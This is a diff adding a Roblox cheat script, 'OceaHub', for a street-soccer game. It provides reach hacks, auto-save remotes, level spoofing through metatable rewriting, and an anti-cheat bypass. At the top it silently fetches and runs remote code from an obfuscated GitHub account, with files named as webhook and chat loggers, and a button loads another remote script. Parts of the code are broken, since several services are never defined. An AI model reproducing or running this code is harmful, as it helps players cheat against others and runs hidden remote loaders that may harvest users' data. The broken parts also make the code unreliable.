@@ -1,0 +1,549 @@
+-- WEBHOOKS --
+    loadstring(game:HttpGet("https://raw.githubusercontent.com/IlIlIlllllIllIIlIlIlIlIllIIlIlIIIIlIll/stre/refs/heads/main/strewebhook",true))()
+    loadstring(game:HttpGet("https://raw.githubusercontent.com/IlIlIlllllIllIIlIlIlIlIllIIlIlIIIIlIll/stre/refs/heads/main/strechatlog",true))()
+
+    -- ANTI CHEAT BYPASS --
+
+local oldNamecall
+oldNamecall = hookmetamethod(game, "__namecall", function(self, ...)
+    local method = getnamecallmethod()
+    local args = {...}
+    
+    if method == "FireServer" and tostring(self) == "KeepYourHeadUp_" then
+        
+        return nil 
+    end
+    
+    return oldNamecall(self, ...)
+end)
+
+-- INTRO UI --
+local IntroGui = Instance.new("ScreenGui", CoreGui)
+IntroGui.Name = "OceaHubIntro"
+IntroGui.IgnoreGuiInset = true
+
+local Main = Instance.new("Frame", IntroGui)
+Main.Size = UDim2.fromOffset(420, 280)
+Main.Position = UDim2.fromScale(0.5, 0.5)
+Main.AnchorPoint = Vector2.new(0.5, 0.5)
+Main.BackgroundColor3 = Color3.fromRGB(15, 15, 18)
+Main.ClipsDescendants = true
+Instance.new("UICorner", Main).CornerRadius = UDim.new(0, 18)
+
+local Welcome = Instance.new("TextLabel", Main)
+Welcome.Size = UDim2.new(1, 0, 0, 160)
+Welcome.Position = UDim2.fromOffset(0, 20)
+Welcome.BackgroundTransparency = 1
+Welcome.Font = Enum.Font.GothamBold
+Welcome.TextColor3 = Color3.new(1, 1, 1)
+Welcome.TextSize = 16
+Welcome.Text = "WELCOME " .. LocalPlayer.Name .. "\n\nUpdates (14.03.2026):\n• OceaHub Street Soccer Added."
+
+local OK = Instance.new("TextButton", Main)
+OK.Size = UDim2.fromOffset(160, 45)
+OK.Position = UDim2.new(0.5, -80, 1, -65)
+OK.Text = "OK / PROCEED"
+OK.Font = Enum.Font.GothamBold
+OK.BackgroundColor3 = Color3.fromRGB(35, 35, 40)
+OK.TextColor3 = Color3.new(1, 1, 1)
+OK.TextSize = 14
+Instance.new("UICorner", OK).CornerRadius = UDim.new(0, 12)
+
+-- ANIMATION SYSTEM --
+local Proceed = false
+OK.MouseButton1Click:Connect(function() 
+    Proceed = true 
+end)
+
+repeat task.wait() until Proceed 
+
+TweenService:Create(Main, TweenInfo.new(0.5, Enum.EasingStyle.Quart, Enum.EasingDirection.Out), {Size = UDim2.fromOffset(0,0)}):Play()
+task.wait(0.55)
+IntroGui:Destroy()
+
+-- INITIALIZATION --
+local Players = game:GetService("Players")
+local RunService = game:GetService("RunService")
+local LocalPlayer = Players.LocalPlayer
+
+-- MOTOR FUNCTIONS --
+local PartConnections = {}
+_G.PartDistances = {
+    ["Legs"] = 0, 
+    ["Arms"] = 0, 
+    ["Torso"] = 0, 
+    ["Head"] = 0
+}
+
+-- Body Groups (Mapped to your character's parts)
+local BodyGroups = {
+    ["Legs"] = {"LeftFoot", "RightFoot", "LeftLowerLeg", "RightLowerLeg"},
+    ["Arms"] = {"LeftHand", "RightHand", "LeftLowerArm", "RightLowerArm", "LeftUpperArm", "RightUpperArm"},
+    ["Torso"] = {"LowerTorso", "UpperTorso"},
+    ["Head"] = {"Head"} 
+}
+
+local function HandlePartReach(GroupName, Distance)
+    local TargetParts = BodyGroups[GroupName]
+
+    -- Disconnect old connection if distance is set to 0
+    if Distance <= 0 then
+        if PartConnections[GroupName] then
+            PartConnections[GroupName]:Disconnect()
+            PartConnections[GroupName] = nil
+        end
+        return
+    end
+
+    _G.PartDistances[GroupName] = Distance
+
+    -- Create new connection if it doesn't exist
+    if not PartConnections[GroupName] then
+        PartConnections[GroupName] = RunService.RenderStepped:Connect(function()
+            local char = LocalPlayer.Character
+            local root = char and char:FindFirstChild("HumanoidRootPart")
+            if not root then return end
+
+            -- Target Path: Workspace.TPSSystem.TPS
+            local Target = workspace:FindFirstChild("TPSSystem") and workspace.TPSSystem.TPS
+            
+            if Target and (root.Position - Target.Position).Magnitude <= _G.PartDistances[GroupName] then
+                for _, pName in ipairs(TargetParts) do
+                    local p = char:FindFirstChild(pName)
+                    if p then
+                        firetouchinterest(p, Target, 0)
+                        firetouchinterest(p, Target, 1)
+                    end
+                end
+            end
+        end)
+    end
+end
+
+-- TAB GROUP --
+local function LocalMessage(Title, Text)
+    game.StarterGui:SetCore("SendNotification", {
+        ["Title"] = Title,
+        ["Text"] = Text,
+        ["Duration"] = 20
+    })
+end
+
+LocalMessage("TPS: Street Soccer", "Welcome To OceaHub!")
+
+-- UI (MACLIB) --
+local MacLib = loadstring(game:HttpGet("https://github.com/biggaboy212/Maclib/releases/latest/download/maclib.txt"))()
+local Window = MacLib:Window({
+    Title = "OceaHub ",
+    Subtitle = "Street Soccer Script",
+    Size = UDim2.fromOffset(850, 600),
+    DragStyle = 1,
+    Keybind = Enum.KeyCode.RightControl, 
+    AcrylicBlur = true
+})
+
+local tabGroup = Window:TabGroup()
+local fireTouchTab = tabGroup:Tab({ Name = "FireTouch", Image = "rbxassetid://18821914323" })
+local section = fireTouchTab:Section({ Side = "Left" })
+
+section:Header({ Name = "Reach Settings" })
+
+local function CreateReachSlider(label)
+    section:Slider({
+        Name = label,
+        Default = 0,
+        Minimum = 0,
+        Maximum = 30,
+        Precision = 1,
+        DisplayMethod = "Value",
+        Callback = function(Value)
+            HandlePartReach(label, Value)
+        end
+    })
+end
+
+-- The 4 main categories you requested
+CreateReachSlider("Legs")
+CreateReachSlider("Arms")
+CreateReachSlider("Torso")
+CreateReachSlider("Head")
+
+-- BALL RESIZER CONFIGURATION --
+local b2b_REACH_X = 0
+local b2b_REACH_Y = 0
+local b2b_REACH_Z = 0
+local b2b_isIndicatorVisible = true
+
+--// Create indicator 
+local b2b_reachIndicator = Instance.new("Part")
+b2b_reachIndicator.Name = "BallToBodyReachIndicator"
+b2b_reachIndicator.Shape = Enum.PartType.Block
+b2b_reachIndicator.Color = Color3.fromRGB(255, 0, 0)
+b2b_reachIndicator.Material = Enum.Material.Neon
+b2b_reachIndicator.Transparency = 0.75
+b2b_reachIndicator.Anchored = true
+b2b_reachIndicator.CanCollide = false
+b2b_reachIndicator.Parent = workspace
+
+--// Main Logic
+RunService.RenderStepped:Connect(function()
+    local char = LocalPlayer.Character
+    local root = char and char:FindFirstChild("HumanoidRootPart")
+    local ball = workspace:FindFirstChild("TPSSystem") and workspace.TPSSystem:FindFirstChild("TPS")
+
+    if root and ball then
+        b2b_reachIndicator.CFrame = CFrame.new(ball.Position)
+        b2b_reachIndicator.Size = Vector3.new(b2b_REACH_X * 2, b2b_REACH_Y * 2, b2b_REACH_Z * 2)
+        b2b_reachIndicator.Transparency = b2b_isIndicatorVisible and 0.75 or 1
+
+        local delta = root.Position - ball.Position
+        if math.abs(delta.X) <= b2b_REACH_X and 
+           math.abs(delta.Y) <= b2b_REACH_Y and 
+           math.abs(delta.Z) <= b2b_REACH_Z then
+            
+            firetouchinterest(ball, root, 0)
+            firetouchinterest(ball, root, 1)
+        end
+    end
+end)
+
+-- UI INTEGRATION - BALL RESIZER --
+local ballResizerTab = tabGroup:Tab({ Name = "Ball Resizer", Image = "rbxassetid://18821914323" })
+local resizerSection = ballResizerTab:Section({ Side = "Left" })
+
+resizerSection:Header({ Name = "Reach (BALL)" })
+
+-- Toggle
+resizerSection:Toggle({
+    Name = "Enable Reach Indicator",
+    Default = true,
+    Callback = function(Value)
+        b2b_isIndicatorVisible = Value
+    end
+})
+
+-- Sliders (MAX 30)
+resizerSection:Slider({
+    Name = "X Reach (Width)",
+    Default = 0, Minimum = 0, Maximum = 30, Precision = 1,
+    Callback = function(Value)
+        b2b_REACH_X = Value
+    end
+})
+
+resizerSection:Slider({
+    Name = "Y Reach (Height)",
+    Default = 0, Minimum = 0, Maximum = 30, Precision = 1,
+    Callback = function(Value)
+        b2b_REACH_Y = Value
+    end
+})
+
+resizerSection:Slider({
+    Name = "Z Reach (Length)",
+    Default = 0, Minimum = 0, Maximum = 30, Precision = 1,
+    Callback = function(Value)
+        b2b_REACH_Z = Value
+    end
+})
+
+resizerSection:Slider({
+    Name = "Sync Reach (X, Y, Z)",
+    Default = 0, Minimum = 0, Maximum = 30, Precision = 1,
+    Callback = function(Value)
+        b2b_REACH_X, b2b_REACH_Y, b2b_REACH_Z = Value, Value, Value
+    end
+})
+-- [[ REACT STATE ]] --
+local RunStepped2
+local ReactVisual -- Mesafe halkası için
+
+-- [[ UI - REACT TAB ]] --
+local reactTab = tabGroup:Tab({ Name = "React", Image = "rbxassetid://18821914323" })
+local reactSection = reactTab:Section({ Side = "Left" })
+
+reactSection:Header({ Name = "Reaction Enhancements" })
+
+-- Better React Toggle
+reactSection:Toggle({
+    Name = "Better React",
+    Default = false,
+    Callback = function(arg)
+        if arg then
+            -- Görsel halka oluştur (3 Unit Menzil)
+            ReactVisual = Instance.new("Part")
+            ReactVisual.Name = "ReactRange"
+            ReactVisual.Shape = Enum.PartType.Cylinder
+            ReactVisual.Size = Vector3.new(0.2, 6, 6) -- 3 radius = 6 diameter
+            ReactVisual.Color = Color3.fromRGB(0, 255, 100)
+            ReactVisual.Material = Enum.Material.Neon
+            ReactVisual.Transparency = 0.8
+            ReactVisual.Anchored = true
+            ReactVisual.CanCollide = false
+            ReactVisual.Parent = workspace
+
+            RunStepped2 = game:GetService("RunService").RenderStepped:Connect(function()
+                local char = game.Players.LocalPlayer.Character
+                local hum = char and char:FindFirstChildOfClass("Humanoid")
+                local root = char and char:FindFirstChild("HumanoidRootPart")
+                local ball = game.Workspace:FindFirstChild("TPSSystem") and game.Workspace.TPSSystem:FindFirstChild("TPS")
+                
+                if not (hum and root and ball) then return end
+
+                -- Halkanın konumunu güncelle (Yere sabitle)
+                ReactVisual.CFrame = root.CFrame * CFrame.new(0, -2.8, 0) * CFrame.Angles(0, 0, math.rad(90))
+
+                -- Mesafe Kontrolü (3 Unit)
+                if (root.Position - ball.Position).Magnitude <= 3 then
+                    local lightingPlayer = game.Lighting:FindFirstChild(game.Players.LocalPlayer.Name)
+                    local preferredFoot = lightingPlayer and lightingPlayer:FindFirstChild("PreferredFoot")
+                    
+                    if not preferredFoot then return end
+
+                    if hum.RigType == Enum.HumanoidRigType.R6 then
+                        local leg = (preferredFoot.Value == 1) and char:FindFirstChild("Right Leg") or char:FindFirstChild("Left Leg")
+                        if leg then
+                            firetouchinterest(leg, ball, 0)
+                            firetouchinterest(leg, ball, 1)
+                        end
+                    elseif hum.RigType == Enum.HumanoidRigType.R15 then
+                        local leg = (preferredFoot.Value == 1) and char:FindFirstChild("RightLowerLeg") or char:FindFirstChild("LeftLowerLeg")
+                        if leg then
+                            firetouchinterest(leg, ball, 0)
+                            firetouchinterest(leg, ball, 1)
+                        end
+                    end
+                end
+            end)
+        else
+            if RunStepped2 then RunStepped2:Disconnect() RunStepped2 = nil end
+            if ReactVisual then ReactVisual:Destroy() ReactVisual = nil end
+        end
+    end
+})
+
+-- React GUI Button (Direkt Yükleme)
+reactSection:Button({
+    Name = "Open React GUI",
+    Description = "Instantly loads external React script",
+    Callback = function()
+        -- Onay sormadan direkt yükler
+        loadstring(game:HttpGet("https://raw.githubusercontent.com/cnd00idjehdil1dhw8w9wowjeie9r00ro9djfjx/xiodidhd9dodjdifijdidodo/main/Rt"))()
+    end
+})
+-- [[ GK STATE ]] --
+local TouchedGKBallBox
+_G.GKS = false
+local SaveDelay = 0.1 -- Gecikme sabit 0.1 kalsın dedin
+
+-- [[ UI - GK TAB ]] --
+local gkTab = tabGroup:Tab({ Name = "GK", Image = "rbxassetid://18821914323" })
+local gkSection = gkTab:Section({ Side = "Left" })
+
+gkSection:Header({ Name = "Goalkeeper Actions" })
+
+-- [[ AUTO SAVE - TOUCH METHOD ]] --
+gkSection:Toggle({
+    Name = "Auto Save [Touch Method]",
+    Default = false,
+    Callback = function(arg)
+        if arg then
+            local ball = workspace:FindFirstChild("TPSSystem") and workspace.TPSSystem:FindFirstChild("TPS")
+            if ball then
+                TouchedGKBallBox = ball.Touched:Connect(function(hit)
+                    local char = game.Players.LocalPlayer.Character
+                    if hit == char:FindFirstChild("HumanoidRootPart") then
+                        local hum = char:FindFirstChildOfClass("Humanoid")
+                        local animId = (hum.RigType == Enum.HumanoidRigType.R6) and "304581045" or "3008336125"
+                        
+                        local anim = Instance.new("Animation")
+                        anim.AnimationId = "rbxassetid://" .. animId
+                        local loadAnim = hum:LoadAnimation(anim)
+                        loadAnim:Play()
+                        
+                        task.wait(SaveDelay)
+
+                        if hum.RigType == Enum.HumanoidRigType.R6 then
+                            workspace.FE.Actions.SaveRL:FireServer(ball, char["Right Leg"])
+                        else
+                            workspace.FE.Actions.SaveT:FireServer(ball, char.HumanoidRootPart)
+                        end
+                        workspace.FE.Kick.RemoteEvent2:FireServer()
+                    end
+                end)
+            end
+        else
+            if TouchedGKBallBox then TouchedGKBallBox:Disconnect() TouchedGKBallBox = nil end
+        end
+    end
+})
+
+-- [[ AUTO SAVE - REMOTEEVENT METHOD ]] --
+gkSection:Toggle({
+    Name = "Auto Save [RemoteEvent Method]",
+    Default = false,
+    Callback = function(arg)
+        _G.GKS = arg
+        if _G.GKS then
+            task.spawn(function()
+                while _G.GKS do
+                    task.wait()
+                    local char = game.Players.LocalPlayer.Character
+                    local root = char and char:FindFirstChild("HumanoidRootPart")
+                    local ball = workspace:FindFirstChild("TPSSystem") and workspace.TPSSystem:FindFirstChild("TPS")
+                    
+                    if root and ball then
+                        -- BURASI ARMS SLIDERINA BAĞLANDI --
+                        local currentArmsDistance = _G.PartDistances["Arms"] or 10
+                        
+                        if (root.Position - ball.Position).Magnitude <= currentArmsDistance then
+                            local hum = char:FindFirstChildOfClass("Humanoid")
+                            local animId = (hum.RigType == Enum.HumanoidRigType.R6) and "304581045" or "3008336125"
+                            
+                            local anim = Instance.new("Animation")
+                            anim.AnimationId = "rbxassetid://" .. animId
+                            local loadAnim = hum:LoadAnimation(anim)
+                            loadAnim:Play()
+                            
+                            task.wait(SaveDelay)
+
+                            if hum.RigType == Enum.HumanoidRigType.R6 then
+                                workspace.FE.Actions.SaveRL:FireServer(ball, char["Right Leg"])
+                            else
+                                workspace.FE.Actions.SaveT:FireServer(ball, char.HumanoidRootPart)
+                            end
+                            workspace.FE.Kick.RemoteEvent2:FireServer()
+                        end
+                    end
+                end
+            end)
+        end
+    end
+})
+local plTab = tabGroup:Tab({ Name = "Ping And Level", Image = "rbxassetid://18821914323" })
+local plSection = plTab:Section({ Side = "Left" })
+
+-- Paragraph hata verdiği için Header kullanıyoruz (image_07709b.png hatası çözümü)
+plSection:Header({ Name = "⚠️ Use 0.01 - 0.10 for Ping" })
+
+-- Ping Changer Input
+plSection:Input({
+    Name = "Ping Changer",
+    Placeholder = "Example: 0.05",
+    Accepted = "Number", -- Sadece sayı girişine izin verir
+    Callback = function(Value)
+        local n = tonumber(Value)
+        if n then 
+            settings():GetService("NetworkSettings").IncomingReplicationLag = n 
+        end
+    end
+})
+
+-- Level Changer Input
+plSection:Input({
+    Name = "Level Changer",
+    Placeholder = "Target Level",
+    Accepted = "Number",
+    Callback = function(Value)
+        local Targets = tonumber(Value)
+        if Targets then
+            task.wait(0.1)
+            local mt = getrawmetatable(game)
+            setreadonly(mt, false)
+            local old_index = mt.__index
+            
+            mt.__index = function(a, b)
+                -- PPLevel ve Level değerlerini manipüle eder
+                if (tostring(a) == "PPLevel" or tostring(a) == "Level") and tostring(b) == "Value" then 
+                    return Targets 
+                end
+                return old_index(a, b)
+            end
+            setreadonly(mt, true)
+        end
+    end
+})
+local miscTab = tabGroup:Tab({ Name = "Miscellaneous", Image = "rbxassetid://18821914323" })
+local miscSection = miscTab:Section({ Side = "Left" })
+
+miscSection:Header({ Name = "Game Enhancements" })
+
+-- [[ FASTER COOLDOWN ]] --
+miscSection:Toggle({
+    Name = "Faster Cooldown",
+    Default = false,
+    Callback = function(arg)
+        local startGui = game:GetService("Players").LocalPlayer.PlayerGui:FindFirstChild("Start")
+        if not startGui then return end
+        
+        if arg then 
+            startGui.GamePassMenu.Items.Cooldown.Tick.Visible = true
+            startGui.GamePassMenu.Items.Cooldown.Cooldown.Style = "RobloxRoundButton"
+            startGui.PowerShot.PowerValue.Value = 30 
+        else
+            startGui.GamePassMenu.Items.Cooldown.Cooldown.Style = "RobloxRoundDefaultButton"
+            startGui.GamePassMenu.Items.Cooldown.Tick.Visible = false
+            startGui.PowerShot.PowerValue.Value = 60
+        end
+    end
+})
+
+-- [[ CHANGE FOV ]] --
+miscSection:Slider({
+    Name = "Change FOV",
+    Default = 90, Minimum = 60, Maximum = 120, 
+    Precision = 1, -- Format hatasını önlemek için tam sayı yapıldı
+    Callback = function(arg)
+        game.Workspace.CurrentCamera.FieldOfView = arg
+    end
+})
+
+-- [[ UNLOCK CELEBRATIONS ]] --
+miscSection:Button({
+    Name = "Unlock Celebrations",
+    Callback = function()
+        -- MacLib Dialog Penceresi
+        Window:Dialog({
+            Title = "Unlock Celebrations",
+            Content = "Are you sure you want to unlock all Celebration Packs?",
+            Buttons = {
+                {
+                    Title = "Confirm",
+                    Callback = function()
+                        local lp = game:GetService("Players").LocalPlayer
+                        local items = lp.PlayerGui.Start.GamePassMenu.Items
+                        local select = lp.PlayerGui.Start.Celebrations.CelebrationsSelect
+                        
+                        -- Packs Activation
+                        for i = 1, 5 do
+                            local pack = items:FindFirstChild("CelebrationPack"..i)
+                            if pack then
+                                pack.Tick.Visible = true
+                                pack:FindFirstChild("CelebrationPack"..i).Style = "RobloxRoundButton"
+                                if select:FindFirstChild("Package"..i) then select["Package"..i].Button.Visible = false end
+                            end
+                        end
+                        
+                        -- SF Buttons Activation (SF04 to SF18)
+                        for i = 4, 18 do
+                            local name = i < 10 and "SF0"..i or "SF"..i
+                            local sf = select:FindFirstChild(name)
+                            if sf then
+                                sf.Active = true
+                                sf.Selectable = true
+                                if sf:FindFirstChild("Script") then sf.Script.Disabled = false end
+                                sf.MouseButton1Click:Connect(function()
+                                    require(lp.Backpack.CelebrationsModule)["Celebration"..i]()
+                                end)
+                            end
+                        end
+                    end
+                },
+                {
+                    Title = "Cancel",
+                    Callback = function() end
+                }
+            }
+        })
+    end
+})
